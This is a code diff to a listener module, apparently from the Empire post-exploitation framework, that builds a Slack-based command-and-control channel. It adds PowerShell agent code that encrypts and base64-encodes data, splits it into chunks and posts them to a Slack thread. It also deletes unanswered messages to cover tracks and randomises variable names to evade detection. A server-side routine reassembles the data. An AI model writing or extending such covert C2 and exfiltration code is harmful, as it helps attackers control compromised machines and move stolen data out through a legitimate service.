@@ -471,18 +471,19 @@ class Listener:
 
                                 # grab the timestamp from the sent message so we can track a response
                                 $slack_response = ConvertFrom-Json20 $response
-                                $script:current_ts = $slack_response["ts"]
+                                $current_ts = $slack_response["ts"]
 
                             }
                             catch [System.Net.WebException]{$null}
 
                             # wait for listener to respond before proceeding
                             $timeout=0
+                            $message_present=$false
                             while($timeout -lt 5) {
 
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($script:current_ts)")
+                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($current_ts)")
                                 $slack_response2=ConvertFrom-Json20 $slack_response2
 
                                 # if no replies give the listener 5 seconds to post a reply else give up
@@ -507,7 +508,7 @@ class Listener:
                             if($message_present) {
                                 # listener has replied grab all replies
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
-                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($script:current_ts)")
+                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($current_ts)")
                                 $slack_response=ConvertFrom-Json20 $slack_response2;
 
                                 $replies = $slack_response["messages"] | select -skip 1;
@@ -522,6 +523,12 @@ class Listener:
 
 
                                 $result
+                            }else{
+
+                                # delete message
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
+                                $delete_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.delete","POST","token=$($APIToken)&channel=$($Channel)&ts=$($current_ts)")
+
                             }
                             
                         }
@@ -547,6 +554,12 @@ class Listener:
                             $Channel = '"""+ channel_id +"""'
                             $AgentID = '"""+ agent_id +"""'
 
+                            function ConvertFrom-Json20([object] $item){ 
+                                add-type -assembly system.web.extensions
+                                $ps_js=new-object system.web.script.serialization.javascriptSerializer
+                                return ,$ps_js.DeserializeObject($item)
+                            }
+
                             $encBytes = encrypt-bytes $packets
                             $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
                             $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
@@ -564,10 +577,29 @@ class Listener:
                             $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                             try {
-                                # get a random posting URI
-                                $taskURI = $Script:TaskURIs | Get-Random
+                                $Parts_to_send = $RoutingPacket_base64 -split "(.{3500})" | where {$_}
+
+                                # send the header
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=--MESSAGE_START--&username=$($AgentID):STAGED")
+                                $thread_ts = (ConvertFrom-Json20 $response)["ts"]
+                                Start-Sleep 1
+
+                                # send the parts
+                                foreach($part in $Parts_to_send) {
+                                    $part = $([System.Net.WebUtility]::UrlEncode($part))
+                                    
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$($part)&username=$($AgentID):STAGED&thread_ts=$thread_ts")
+                                    Start-Sleep 1
+
+                                }
+                                
+
+                                # send the finish
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=--MESSAGE_END--&username=$($AgentID):STAGED&thread_ts=$thread_ts")
+
 
                             }
                             catch [System.Net.WebException]{$null}
@@ -589,6 +621,28 @@ class Listener:
     def start_server(self, listenerOptions):
 
         # utility function for handling commands
+        def get_data(thread_ts):
+
+            finished = False
+            while finished == False:
+                # get all the replies
+                replies = user_slack_client.api_call('channels.replies', channel=channel_id, thread_ts=thread_ts)
+
+                # check if --MESSAGE_END-- has been sent
+                data_return = ''
+                for msg in replies["messages"]:
+                    data_return += msg["text"]
+                    if msg["text"] == '--MESSAGE_END--':
+                        finished = True
+
+                time.sleep(1)
+
+            # now we have all the data sent lets build it back to 
+            data_return = data_return.replace('--MESSAGE_START--','').replace('--MESSAGE_END--','')
+            data = base64.b64decode(data_return)
+
+            return data
+
         def parse_commands(slack_events,bot_id):
 
             # Parses a list of events coming from the Slack RTM API to find commands.
@@ -599,28 +653,46 @@ class Listener:
 
                         # grab more details such as the username of the poster
                         event_details = user_slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
+                        time.sleep(1)
 
                         if 'messages' in event_details:
                             message = event_details["messages"][0]
                             thread_ts = message["ts"]
 
-                            reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)
+                            if 'thread_ts' in message:
 
-                            # by adding a thumbs up helps the listener keep track of what it has processed
-                            if 'username' in message and not 'error' in reaction:
-                                raw_message = message["text"].replace(' ','+')
-                                data = base64.b64decode(raw_message)
-                                agent = message["username"]
-                                if ':' in agent:
-                                    agent, stage = agent.split(':')
+                                if message["thread_ts"] == thread_ts:
 
-                                    return agent, stage, data, thread_ts
+                                    not_thread = True
+                                else:
+                                    not_thread = False
+                            else:
+                                not_thread = True
+
+                            if not_thread:
+                                reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)
+
+                                # by adding a thumbs up helps the listener keep track of what it has processed
+                                if 'username' in message and not 'error' in reaction:
+                                    raw_message = message["text"]
+                                    # incoming agent data from a task
+                                    if raw_message == '--MESSAGE_START--':
+                                        data = get_data(thread_ts)
+                                        agent_sent = True
+                                    else:
+                                        agent_sent = None
+                                        data = base64.b64decode(raw_message)
+
+                                    agent = message["username"]
+                                    if ':' in agent:
+                                        agent, stage = agent.split(':')
+
+                                        return agent, stage, data, thread_ts, agent_sent
 
 
             time.sleep(1)
-            return None, None, None, None
+            return None, None, None, None, None
 
-        # utility functions for handling Empire
         def upload_stager():
 
             ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell')
@@ -789,7 +861,7 @@ class Listener:
 
                 # try to process command sent if fails then simply wait until next poll interval and try again
                 try:
-                    agent, stage, data, thread_ts = parse_commands(slack_client.rtm_read(),bot_id)
+                    agent, stage, data, thread_ts, agent_sent = parse_commands(slack_client.rtm_read(),bot_id)
 
                     # if there is some data then proceed
                     if data:
@@ -839,7 +911,7 @@ class Listener:
                             # Process any further tasks for the agent so it can continue
                             for task in task_data:
                                 lang, data = task
-                                if data:
+                                if data and agent_sent == None:
                                     post_data(base64.encodestring(data),agent,channel_id,thread_ts,listener_name,user_api_token)
 
                    
